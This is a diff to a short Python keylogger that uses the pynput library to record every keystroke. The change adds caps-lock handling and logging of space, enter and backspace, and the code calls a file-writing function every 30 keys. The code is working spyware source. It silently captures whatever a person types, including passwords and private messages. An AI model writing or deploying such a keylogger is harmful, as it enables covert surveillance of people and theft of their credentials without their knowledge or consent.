@@ -1,11 +1,23 @@
 from pynput.keyboard import Listener,Key
 liste=list()
+cpstatus=False
 def bas(key):
-    global liste
+    global liste,cpstatus
     try:
-        liste.append(key.char)
+        if cpstatus:
+            liste.append(key.char.upper())
+        else:
+            liste.append(key.char)
+
     except AttributeError:
-        pass
+        if  key==Key.space:
+            liste.append(" ")
+        if key==Key.enter:
+            liste.append("\n")
+        if key==Key.backspace:
+            liste.append("'<-'")
+        if key==Key.caps_lock:
+            cpstatus=not cpstatus
     if len(liste) >=30:
         dosya_yaz()
         liste=list()
